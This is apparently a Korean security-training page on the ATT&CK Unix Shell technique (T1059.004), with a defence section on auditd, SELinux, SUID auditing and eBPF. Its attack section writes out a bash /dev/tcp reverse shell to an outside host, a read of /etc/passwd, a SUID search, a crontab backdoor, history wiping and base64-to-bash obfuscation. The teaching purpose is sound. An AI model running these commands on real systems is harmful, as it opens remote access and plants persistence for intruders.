T1059.004: Unix Shell

Execution

Unix Shell

bash/sh를 이용한 리버스 쉘, 리눅스 정찰, 권한 상승

#1. 개념과 원리

Unix Shell 악용이란?

bash, sh, zsh 등 Unix/Linux 쉘을 악용하여 시스템 명령을 실행합니다. 리버스 쉘, 바인드 쉘로 원격 접근을 확보하고, cron, bashrc 등을 통해 지속성을 유지합니다. 파이프(|), 리다이렉트(>), 서브쉘($())을 활용한 복잡한 명령 체인이 특징입니다.

리버스 쉘

bash -i >& /dev/tcp/IP/PORT 0>&1

권한 상승

SUID, sudo 미스설정, 커널 익스플로잇

지속성

.bashrc, crontab, systemd에 백도어 삽입

#2. 공격 기법 분석

# bash 리버스 쉘 + 정찰
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
id && uname -a && cat /etc/passwd
# 권한 상승 + 지속성
find / -perm -4000 -type f 2>/dev/null
echo '* * * * * /tmp/.backdoor' | crontab -

공격 분석

  • 리버스 쉘: /dev/tcp를 통한 bash 리버스 연결
  • SUID 악용: find -exec, vim, nmap 등 SUID 바이너리
  • 히스토리 삭제: HISTFILE=/dev/null로 흔적 제거
  • Base64 난독화: echo "encoded" | base64 -d | bash

#3. 탐지 및 방어 + 퀴즈

방어 전략

  • auditd: execve 시스콜 감사로 모든 명령 기록
  • SELinux/AppArmor: 프로세스 실행 범위 제한
  • SUID 감사: 불필요한 SUID 비트 제거
  • 쉘 제한: rbash(restricted bash) 적용
  • eBPF: 커널 수준 실시간 모니터링
